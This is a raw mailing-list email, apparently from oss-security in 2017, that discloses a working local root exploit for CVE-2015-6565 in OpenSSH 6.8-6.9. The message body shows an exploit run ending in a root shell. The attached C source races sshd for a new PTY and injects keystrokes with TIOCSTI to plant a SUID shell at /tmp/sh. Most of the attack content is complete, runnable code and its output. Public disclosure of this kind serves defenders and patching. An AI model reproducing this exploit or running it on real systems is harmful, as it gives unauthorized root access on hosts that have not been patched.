X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3662" "Thursday" "26" "January" "2017" "10:07:24" "+0100" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20170126100724.99313jlcg64zbaec@webmail.alunos.dcc.fc.up.pt>" "137" "[oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9) can lead to local  privesc on Linux" nil nil nil "1" "2017012609:07:24" "[oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9) can lead to local privesc on Linux" (number mark "U       up201407890@ Jan 26  137/3662  " thread-indent "\"[oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9) can lead to local  privesc on Linux\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5706 invoked by uid 550); 26 Jan 2017 16:51:49 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11674 invoked from network); 26 Jan 2017 12:22:26 -0000
Message-ID: <20170126100724.99313jlcg64zbaec@webmail.alunos.dcc.fc.up.pt>
Date: Thu, 26 Jan 2017 10:07:24 +0100
From: up201407890@alunos.dcc.fc.up.pt
To: oss-security@lists.openwall.com
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="=_3hl3p6vb1fms"
Content-Transfer-Encoding: 7bit
User-Agent: Internet Messaging Program (IMP) H3 (4.2)
X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
Subject: [oss-security] Re: OpenSSH: CVE-2015-6565 (pty issue in 6.8-6.9) can lead to
	local  privesc on Linux

--=_3hl3p6vb1fms
Content-Type: text/plain;
	charset=ISO-8859-1;
	DelSp="Yes";
	format="flowed"
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hi list,

I know I'm late to the party, but I was bored, so I decided to write=20=20
an exploit for CVE-2015-6565 which affects OpenSSH 6.8-6.9
It is mostly considered to be a "DoS", even though Jann Horn publicly=20=20
told how it could be exploited for local privilege escalation, but I=20=20
guess its either PoC||GTFO for users to update.

 From https://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2015-6565

"sshd in OpenSSH 6.8 and 6.9 uses world-writable permissions for TTY=20=20
devices, which allows local users to cause a denial of service=20=20
(terminal disruption) or possibly have unspecified other impact by=20=20
writing to a device, as demonstrated by writing an escape sequence."

I think the description should be updated.

$ gcc not_an_sshnuke.c -o not_an_sshnuke
$ ./not_an_sshnuke /dev/pts/3
[*] Waiting for slave device /dev/pts/3
[+] Got PTY slave /dev/pts/3
[+] Making PTY slave the controlling terminal
[+] SUID shell at /tmp/sh
$ /tmp/sh --norc --noprofile -p
# id
euid=3D0(root) groups=3D0(root)

Thanks,
Federico Bento.



----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

--=_3hl3p6vb1fms
Content-Type: text/x-csrc;
	charset=UTF-8;
	name="not_an_sshnuke.c"
Content-Disposition: attachment;
	filename="not_an_sshnuke.c"
Content-Transfer-Encoding: quoted-printable

/*=20
 *  not_an_sshnuke.c
 *
 *  Federico Bento
 *
 *  up201407890@alunos.dcc.fc.up.pt
 *  https://twitter.com/uid1000
 *=20
 *  OpenSSH 6.8-6.9 local privilege escalation - CVE-2015-6565
 *=20=20
 *  Considered mostly to be a "DoS", turns out to be a priv esc vuln.
 *  https://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2015-6565
 *
 *  Shoutz to Jann Horn for the detailed analysis
 *  And also to all my elite colleagues, specially xSTF :)
 *
 *
 *  $ gcc not_an_sshnuke.c -o not_an_sshnuke
 *  $ ./not_an_sshnuke /dev/pts/3
 *  [*] Waiting for slave device /dev/pts/3
 *  [+] Got PTY slave /dev/pts/3
 *  [+] Making PTY slave the controlling terminal
 *  [+] SUID shell at /tmp/sh
 *  $ /tmp/sh --norc --noprofile -p
 *  # id
 *  euid=3D0(root) groups=3D0(root)
 *
 */

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
=20=20=20=20=20
int main(int argc, char *argv[])
{
     char *cmd =3D "cp /bin/sh /tmp/sh; chmod u+s /tmp/sh\n";
     int pid, pts =3D -1;

     if(argc !=3D 2) {
          fprintf(stderr, "Usage: %s /dev/pts/X\n", argv[0]);
	  fprintf(stderr, "Where X is next slave device to be created\n");
	  return 1;
     }
=09
     if(!access(argv[1], F_OK)) {
          fprintf(stderr, "[-] %s device already exists\n", argv[1]);
          return 1;
     }

     pid =3D fork();

     if(pid < 0) {
	  fprintf(stderr, "[-] fork failed\n");
	  return 1;
     }
=09
     if(pid =3D=3D 0) {
          printf("[*] Waiting for slave device %s\n", argv[1]);
=09=09
	  /* win the race by opening the PTY slave before sshd's child */
	  while(pts =3D=3D -1)
	       pts =3D open(argv[1], O_WRONLY);=20

	       printf("[+] Got PTY slave %s\n", argv[1]);
               printf("[+] Making PTY slave the controlling terminal\n");
=09=09
	       dup2(pts, 0); dup2(pts, 1); dup2(pts, 2);
	       setsid();
               ioctl(0, TIOCSCTTY, 1);

	       while(*cmd)
	            ioctl(0, TIOCSTI, cmd++);
     }

     else {
          wait(NULL);
	  printf("[+] SUID shell at /tmp/sh\n");
	  return 0;
     }
}=

--=_3hl3p6vb1fms--

